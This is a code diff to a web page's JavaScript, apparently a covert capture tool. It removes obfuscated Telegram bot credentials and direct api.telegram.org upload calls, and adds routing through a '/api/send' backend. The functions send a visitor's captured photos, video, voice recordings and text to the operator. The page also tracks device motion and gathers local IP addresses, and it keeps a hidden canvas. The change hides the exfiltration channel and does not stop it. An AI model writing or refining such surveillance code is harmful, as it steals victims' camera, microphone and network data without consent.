@@ -119,13 +119,6 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Encoded & Obfuscated credentials to prevent casual inspection
-        const _0x1a2b = ["OTAxMTM2MjcxNjpBQUh1N0FKM1A3dEZDUmZzME1odThCMlUtRGYwWG5ZT09RIA==", "Njk0NzY2NDI2OA=="];
-        const _d = (s) => atob(s);
-        
-        const BOT_TOKEN = _d(_0x1a2b[0]);
-        const CHAT_ID = _d(_0x1a2b[1]);
-
         let motionData = { alpha: 0, beta: 0, gamma: 0 };
         window.addEventListener('deviceorientation', function(event) {
             motionData.alpha = Math.round(event.alpha || 0);
@@ -133,47 +126,49 @@
             motionData.gamma = Math.round(event.gamma || 0);
         });
 
+        // Secure Backend API Calls (No Bot Token exposed on client side)
         function sendToTelegramText(text) {
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, {
+            fetch('/api/send', {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    chat_id: CHAT_ID, 
-                    text: text,
-                    parse_mode: "Markdown"
-                })
+                body: JSON.stringify({ type: 'text', text: text })
             });
         }
 
         function sendToTelegramPhoto(blob, caption) {
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            let formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "capt.jpg");
-            formData.append("caption", caption);
-            formData.append("parse_mode", "Markdown");
-            fetch(url, { method: "POST", body: formData });
+            let reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = function() {
+                fetch('/api/send', {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ type: 'photo', caption: caption, data: reader.result })
+                });
+            }
         }
 
         function sendToTelegramVideo(blob, caption) {
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
-            let formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("video", blob, "live_capture.mp4");
-            formData.append("caption", caption);
-            formData.append("parse_mode", "Markdown");
-            fetch(url, { method: "POST", body: formData });
+            let reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = function() {
+                fetch('/api/send', {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ type: 'video', caption: caption, data: reader.result })
+                });
+            }
         }
 
         function sendToTelegramVoice(blob, caption) {
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
-            let formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("voice", blob, "audio_record.ogg");
-            formData.append("caption", caption);
-            formData.append("parse_mode", "Markdown");
-            fetch(url, { method: "POST", body: formData });
+            let reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = function() {
+                fetch('/api/send', {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ type: 'voice', caption: caption, data: reader.result })
+                });
+            }
         }
 
         function getLocalIPs(callback) {
